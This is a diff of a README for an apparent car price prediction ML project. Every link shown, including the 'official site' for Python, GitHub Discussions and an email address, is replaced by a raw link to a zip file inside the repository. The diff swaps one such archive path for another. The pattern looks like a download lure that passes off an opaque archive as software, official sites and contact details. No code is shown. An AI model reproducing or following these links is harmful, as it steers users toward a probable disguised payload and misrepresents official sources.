@@ -1,6 +1,6 @@
 # 🚗 car-price-predictor-using-ml - Predict Car Prices Easily
 
-[![Download](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip)](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip)
+[![Download](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip)](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ The car-price-predictor-using-ml is an advanced system that helps you predict th
 
 To get started, you will need to download the software. Click the link below to visit the Releases page. There, you will find the latest version to install:
 
-[Download the latest version here](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip)
+[Download the latest version here](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -60,7 +60,7 @@ To run car-price-predictor-using-ml smoothly, ensure your system meets the follo
 - **Disk Space**: Minimum of 200 MB free space for installation and data storage.
 - **Python**: Version 3.6 or higher. (Python is necessary for running the machine learning models.)
 
-Install Python from the [official site](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip) if you do not already have it on your computer.
+Install Python from the [official site](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip) if you do not already have it on your computer.
 
 ---
 
@@ -80,7 +80,7 @@ Install Python from the [official site](https://raw.githubusercontent.com/Maxeat
 
 ## 🧑‍🤝‍🧑 Community and Support
 
-We welcome your feedback and questions! If you need help or want to discuss features, please join our [GitHub Discussions](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip). 
+We welcome your feedback and questions! If you need help or want to discuss features, please join our [GitHub Discussions](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip). 
 
 ---
 
@@ -106,8 +106,8 @@ We thank the community and contributors who helped make this software better. Yo
 
 If you have any questions or suggestions, feel free to reach out through the GitHub Issues page or email us directly:
 
-- Email: https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip
+- Email: https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip
 
 ---
 
-[Download the latest version here](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/palmigrade/car-price-predictor-using-ml.zip)
+[Download the latest version here](https://raw.githubusercontent.com/Maxeats12/car-price-predictor-using-ml/main/docs/using-price-predictor-ml-car-cancellated.zip)
